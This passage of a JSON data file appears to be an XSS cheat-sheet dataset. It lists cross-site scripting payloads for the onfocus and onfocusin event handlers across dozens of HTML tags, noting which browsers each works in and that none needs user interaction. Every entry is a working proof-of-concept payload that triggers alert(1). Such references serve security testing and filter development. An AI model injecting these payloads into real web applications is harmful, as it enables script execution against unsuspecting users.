                        "code": "<i id=x tabindex=1 onfocus=alert(1)><\/i>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "image",
                        "code": "<image id=x tabindex=1 onfocus=alert(1)><\/image>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "img",
                        "code": "<img id=x tabindex=1 onfocus=alert(1)><\/img>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "ins",
                        "code": "<ins id=x tabindex=1 onfocus=alert(1)><\/ins>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "kbd",
                        "code": "<kbd id=x tabindex=1 onfocus=alert(1)><\/kbd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "label",
                        "code": "<label id=x tabindex=1 onfocus=alert(1)><\/label>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "legend",
                        "code": "<legend id=x tabindex=1 onfocus=alert(1)><\/legend>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "li",
                        "code": "<li id=x tabindex=1 onfocus=alert(1)><\/li>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "listing",
                        "code": "<listing id=x tabindex=1 onfocus=alert(1)><\/listing>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "main",
                        "code": "<main id=x tabindex=1 onfocus=alert(1)><\/main>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "map",
                        "code": "<map id=x tabindex=1 onfocus=alert(1)><\/map>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "mark",
                        "code": "<mark id=x tabindex=1 onfocus=alert(1)><\/mark>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "marquee",
                        "code": "<marquee id=x tabindex=1 onfocus=alert(1)><\/marquee>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "menu",
                        "code": "<menu id=x tabindex=1 onfocus=alert(1)><\/menu>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "menuitem",
                        "code": "<menuitem id=x tabindex=1 onfocus=alert(1)><\/menuitem>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "meta",
                        "code": "<meta id=x tabindex=1 onfocus=alert(1) style=display:block><\/meta>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "meter",
                        "code": "<meter id=x tabindex=1 onfocus=alert(1)><\/meter>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "multicol",
                        "code": "<multicol id=x tabindex=1 onfocus=alert(1)><\/multicol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "nav",
                        "code": "<nav id=x tabindex=1 onfocus=alert(1)><\/nav>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "nextid",
                        "code": "<nextid id=x tabindex=1 onfocus=alert(1)><\/nextid>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "nobr",
                        "code": "<nobr id=x tabindex=1 onfocus=alert(1)><\/nobr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "noembed",
                        "code": "<noembed id=x tabindex=1 onfocus=alert(1)><\/noembed>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "noframes",
                        "code": "<noframes id=x tabindex=1 onfocus=alert(1)><\/noframes>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "noscript",
                        "code": "<noscript id=x tabindex=1 onfocus=alert(1)><\/noscript>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "ol",
                        "code": "<ol id=x tabindex=1 onfocus=alert(1)><\/ol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "optgroup",
                        "code": "<optgroup id=x tabindex=1 onfocus=alert(1)><\/optgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "option",
                        "code": "<option id=x tabindex=1 onfocus=alert(1)><\/option>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "output",
                        "code": "<output id=x tabindex=1 onfocus=alert(1)><\/output>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "p",
                        "code": "<p id=x tabindex=1 onfocus=alert(1)><\/p>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "param",
                        "code": "<param id=x tabindex=1 onfocus=alert(1)><\/param>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "picture",
                        "code": "<picture id=x tabindex=1 onfocus=alert(1)><\/picture>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "plaintext",
                        "code": "<plaintext id=x tabindex=1 onfocus=alert(1)><\/plaintext>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "pre",
                        "code": "<pre id=x tabindex=1 onfocus=alert(1)><\/pre>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "progress",
                        "code": "<progress id=x tabindex=1 onfocus=alert(1)><\/progress>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "q",
                        "code": "<q id=x tabindex=1 onfocus=alert(1)><\/q>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "rb",
                        "code": "<rb id=x tabindex=1 onfocus=alert(1)><\/rb>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "rp",
                        "code": "<rp id=x tabindex=1 onfocus=alert(1)><\/rp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "rt",
                        "code": "<rt id=x tabindex=1 onfocus=alert(1)><\/rt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "rtc",
                        "code": "<rtc id=x tabindex=1 onfocus=alert(1)><\/rtc>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "ruby",
                        "code": "<ruby id=x tabindex=1 onfocus=alert(1)><\/ruby>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "s",
                        "code": "<s id=x tabindex=1 onfocus=alert(1)><\/s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "samp",
                        "code": "<samp id=x tabindex=1 onfocus=alert(1)><\/samp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "script",
                        "code": "<script id=x tabindex=1 onfocus=alert(1)><\/script>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "section",
                        "code": "<section id=x tabindex=1 onfocus=alert(1)><\/section>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "shadow",
                        "code": "<shadow id=x tabindex=1 onfocus=alert(1)><\/shadow>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "slot",
                        "code": "<slot id=x tabindex=1 onfocus=alert(1)><\/slot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "small",
                        "code": "<small id=x tabindex=1 onfocus=alert(1)><\/small>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "source",
                        "code": "<source id=x tabindex=1 onfocus=alert(1)><\/source>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "spacer",
                        "code": "<spacer id=x tabindex=1 onfocus=alert(1)><\/spacer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "span",
                        "code": "<span id=x tabindex=1 onfocus=alert(1)><\/span>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "strike",
                        "code": "<strike id=x tabindex=1 onfocus=alert(1)><\/strike>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "strong",
                        "code": "<strong id=x tabindex=1 onfocus=alert(1)><\/strong>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "style",
                        "code": "<style id=x tabindex=1 onfocus=alert(1) style=display:block><\/style>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "sub",
                        "code": "<sub id=x tabindex=1 onfocus=alert(1)><\/sub>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "summary",
                        "code": "<summary id=x tabindex=1 onfocus=alert(1)><\/summary>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "sup",
                        "code": "<sup id=x tabindex=1 onfocus=alert(1)><\/sup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "table",
                        "code": "<table id=x tabindex=1 onfocus=alert(1)><\/table>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "tbody",
                        "code": "<tbody id=x tabindex=1 onfocus=alert(1)><\/tbody>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "td",
                        "code": "<td id=x tabindex=1 onfocus=alert(1)><\/td>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "template",
                        "code": "<template id=x tabindex=1 onfocus=alert(1)><\/template>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "tfoot",
                        "code": "<tfoot id=x tabindex=1 onfocus=alert(1)><\/tfoot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "th",
                        "code": "<th id=x tabindex=1 onfocus=alert(1)><\/th>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "thead",
                        "code": "<thead id=x tabindex=1 onfocus=alert(1)><\/thead>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "time",
                        "code": "<time id=x tabindex=1 onfocus=alert(1)><\/time>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "title",
                        "code": "<title id=x tabindex=1 onfocus=alert(1)><\/title>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "tr",
                        "code": "<tr id=x tabindex=1 onfocus=alert(1)><\/tr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "track",
                        "code": "<track id=x tabindex=1 onfocus=alert(1)><\/track>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "tt",
                        "code": "<tt id=x tabindex=1 onfocus=alert(1)><\/tt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "u",
                        "code": "<u id=x tabindex=1 onfocus=alert(1)><\/u>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "ul",
                        "code": "<ul id=x tabindex=1 onfocus=alert(1)><\/ul>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "var",
                        "code": "<var id=x tabindex=1 onfocus=alert(1)><\/var>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "wbr",
                        "code": "<wbr id=x tabindex=1 onfocus=alert(1)><\/wbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "xmp",
                        "code": "<xmp id=x tabindex=1 onfocus=alert(1)><\/xmp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "custom tags",
                        "code": "<xss autofocus tabindex=1 onfocus=alert(1)><\/xss>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    }
                ]
            },
            "onfocusin": {
                "description": "Fires when the element has focus",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input autofocus onfocusin=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "select",
                        "code": "<select autofocus onfocusin=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "textarea",
                        "code": "<textarea autofocus onfocusin=alert(1)>test<\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "button",
                        "code": "<button autofocus onfocusin=alert(1)>test<\/button>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "input2",
                        "code": "<input id=x onfocusin=alert(1)>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "input3",
                        "code": "<input type=checkbox id=x onfocusin=alert(1)>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "input4",
                        "code": "<input type=radio id=x onfocusin=alert(1)>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "area",
                        "code": "<img usemap=#x><map name=\"x\"><area href onfocusin=alert(1) id=x>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "iframe",
                        "code": "<iframe id=x onfocusin=alert(1)>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "iframe2",
                        "code": "<iframe autofocus onfocusin=alert(1)>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "frame",
                        "code": "<frameset><frame id=x onfocusin=alert(1)>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false,
                        "hash": "#x",
                        "context": "before_body"
                    },
                    {
                        "tag": "embed",
                        "code": "<embed id=x onfocusin=alert(1) type=text\/html>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "object",
                        "code": "<object id=x onfocusin=alert(1) type=text\/html>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "svg",
                        "code": "<svg id=x onfocusin=alert(1)>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "keygen",
                        "code": "<keygen id=x onfocusin=alert(1)>",
                        "browsers": [
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "video",
                        "code": "<video id=x controls onfocusin=alert(1)><source src=\"validvideo.mp4\" type=video\/mp4><\/video>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "video2",
                        "code": "<video controls src=1 onfocusin=alert(1) autofocus>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio id=x controls onfocusin=alert(1) id=x><source src=\"validaudio.wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "audio2",
                        "code": "<audio controls src=1 onfocusin=alert(1) autofocus>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "link",
                        "code": "<link onfocusin=alert(1) id=x tabindex=1 style=display:block>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "keygen",
                        "code": "<keygen autofocus onfocusin=alert(1)>",
                        "browsers": [
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "a",
                        "code": "<a id=x tabindex=1 onfocusin=alert(1)><\/a>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "a2",
                        "code": "<a autofocus onfocusin=alert(1) href><\/a>",
                        "browsers": [
                            "chrome"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "abbr",
                        "code": "<abbr id=x tabindex=1 onfocusin=alert(1)><\/abbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "acronym",
                        "code": "<acronym id=x tabindex=1 onfocusin=alert(1)><\/acronym>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "address",
                        "code": "<address id=x tabindex=1 onfocusin=alert(1)><\/address>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "applet",
                        "code": "<applet id=x tabindex=1 onfocusin=alert(1)><\/applet>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "article",
                        "code": "<article id=x tabindex=1 onfocusin=alert(1)><\/article>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "aside",
                        "code": "<aside id=x tabindex=1 onfocusin=alert(1)><\/aside>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "b",
                        "code": "<b id=x tabindex=1 onfocusin=alert(1)><\/b>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "bdi",
                        "code": "<bdi id=x tabindex=1 onfocusin=alert(1)><\/bdi>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "bdo",
                        "code": "<bdo id=x tabindex=1 onfocusin=alert(1)><\/bdo>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "big",
                        "code": "<big id=x tabindex=1 onfocusin=alert(1)><\/big>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "blink",
                        "code": "<blink id=x tabindex=1 onfocusin=alert(1)><\/blink>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "blockquote",
                        "code": "<blockquote id=x tabindex=1 onfocusin=alert(1)><\/blockquote>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "body",
                        "code": "<body id=x tabindex=1 onfocusin=alert(1)><\/body>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "br",
                        "code": "<br id=x tabindex=1 onfocusin=alert(1)><\/br>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "canvas",
                        "code": "<canvas id=x tabindex=1 onfocusin=alert(1)><\/canvas>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "caption",
                        "code": "<caption id=x tabindex=1 onfocusin=alert(1)><\/caption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "center",
                        "code": "<center id=x tabindex=1 onfocusin=alert(1)><\/center>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "cite",
                        "code": "<cite id=x tabindex=1 onfocusin=alert(1)><\/cite>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "code",
                        "code": "<code id=x tabindex=1 onfocusin=alert(1)><\/code>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "col",
                        "code": "<col id=x tabindex=1 onfocusin=alert(1)><\/col>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "colgroup",
                        "code": "<colgroup id=x tabindex=1 onfocusin=alert(1)><\/colgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "command",
                        "code": "<command id=x tabindex=1 onfocusin=alert(1)><\/command>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "content",
                        "code": "<content id=x tabindex=1 onfocusin=alert(1)><\/content>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "data",
                        "code": "<data id=x tabindex=1 onfocusin=alert(1)><\/data>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "datalist",
                        "code": "<datalist id=x tabindex=1 onfocusin=alert(1)><\/datalist>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dd",
                        "code": "<dd id=x tabindex=1 onfocusin=alert(1)><\/dd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "del",
                        "code": "<del id=x tabindex=1 onfocusin=alert(1)><\/del>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "details",
                        "code": "<details id=x tabindex=1 onfocusin=alert(1)><\/details>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dfn",
                        "code": "<dfn id=x tabindex=1 onfocusin=alert(1)><\/dfn>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dialog",
                        "code": "<dialog id=x tabindex=1 onfocusin=alert(1)><\/dialog>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dir",
                        "code": "<dir id=x tabindex=1 onfocusin=alert(1)><\/dir>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "div",
                        "code": "<div id=x tabindex=1 onfocusin=alert(1)><\/div>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dl",
                        "code": "<dl id=x tabindex=1 onfocusin=alert(1)><\/dl>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "dt",
                        "code": "<dt id=x tabindex=1 onfocusin=alert(1)><\/dt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "element",
                        "code": "<element id=x tabindex=1 onfocusin=alert(1)><\/element>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "em",
                        "code": "<em id=x tabindex=1 onfocusin=alert(1)><\/em>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "fieldset",
                        "code": "<fieldset id=x tabindex=1 onfocusin=alert(1)><\/fieldset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "figcaption",
